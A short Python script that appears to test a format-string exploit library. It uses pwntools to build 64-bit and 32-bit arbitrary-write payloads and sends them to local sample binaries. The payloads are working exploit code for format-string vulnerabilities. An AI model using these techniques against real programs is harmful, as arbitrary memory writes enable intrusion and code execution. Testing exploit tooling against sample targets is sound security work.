from fmtstr import FormatString
from pwn import *

print '-- now test 64bit'

fmt = FormatString(offset=6, written=8, bits=64)
fmt[0x601040] = p64(0x1234567890abcdef)
payload, sig = fmt.build()

print(hexdump(payload))

io = process('./sample/sample-fmt')
io.sendline('A' * 8 + payload)
io.recvuntil(sig)
print io.recvline()
io.close()

print '-- now test 32bit'

fmt = FormatString(offset=7, written=2, bits=32)
fmt[0x804a020] = p64(0x1234567890abcdef)
payload, sig = fmt.build()

print(hexdump('\0\0' + payload))

io = process('./sample/sample-fmt-32')
io.sendline('A' * 2 + payload)
io.recvuntil(sig)
print io.recvline()
io.close()
